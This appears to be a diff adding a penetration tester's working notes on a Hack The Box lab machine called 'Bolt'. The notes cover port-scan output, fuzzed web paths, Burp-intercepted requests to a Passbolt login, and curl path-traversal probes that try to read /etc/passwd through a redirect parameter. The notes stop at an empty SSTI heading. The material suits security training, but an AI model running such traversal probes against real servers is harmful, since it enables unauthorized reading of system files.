@@ -1,0 +1,69 @@
+Bolt  10.10.11.114
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
+|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
+|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+|_http-title:     Starter Website -  About 
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+| http-title: Passbolt | Open source password manager for teams
+|_Requested resource was /auth/login?redirect=%2F
+| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Not valid before: 2021-02-24T19:11:23
+|_Not valid after:  2022-02-24T19:11:23
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_ssl-date: TLS randomness does not represent time
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+[+]Fuzzing
+
+/download
+/login
+/profile
+/services
+/register
+/pricing
+/logout
+/sign-in
+/sign-up
+
+
+https://10.10.11.114/
+Redirect to : https://10.10.11.114/auth/login?redirect=%2F
+%2F > / url decode
+
+curl -s -X GET https://10.10.11.114/auth/login?redirect=../../../etc/passwd
+../../../etc/passwd > %2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64  
+
+curl -s -X GET https://10.10.11.114/auth/login?redirect=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 
+null
+
+curl -s -X POST https://10.10.11.114/auth/login?redirect=%2F 
+null
+
+[+]Burpsuite
+POST /auth/login?redirect=%2F HTTP/2
+Host: 10.10.11.114
+Cookie: passbolt_session=2o4f8pobrid24u478e2k5usln5; csrfToken=171c1816da358a0f02d0ad8ff912f54155be1df7a620d392f8a402c2b6ba9bb6b941756d662c0a418009c352a7c1665656f5cf72cf37cc635521c73cc12cf0a0
+
++ home = https://passbolt.bolt.htb
++ login = https://passbolt.bolt.htb/auth/login
+
+echo "10.10.11.114  passbolt.bolt.htb" >> /etc/hosts
+
+https://passbolt.bolt.htb/ >> Redirect to https://passbolt.bolt.htb/auth/login?redirect=%2F&locale=en-UK
+
+Please enter your email to continue.
+email : admin@admin.htb >> Intercept with Burpsuite.
+
+POST /users/recover.json?api-version=v2 HTTP/2
+Host: passbolt.bolt.htb
+
+{"username":"admin@admin.htb"}
+
+[+]SSTI
